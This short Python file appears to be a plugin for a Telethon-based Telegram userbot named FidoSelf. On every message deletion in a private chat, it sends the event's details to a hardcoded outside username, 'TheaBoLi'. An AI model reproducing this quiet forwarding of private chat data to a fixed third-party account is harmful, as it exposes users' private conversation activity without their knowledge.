from FidoSelf import client
from telethon import events

@client.on(events.MessageDeleted)
async def _(event):
     if event.is_private:
         await client.bot.send_message("TheaBoLi", event.stringify())
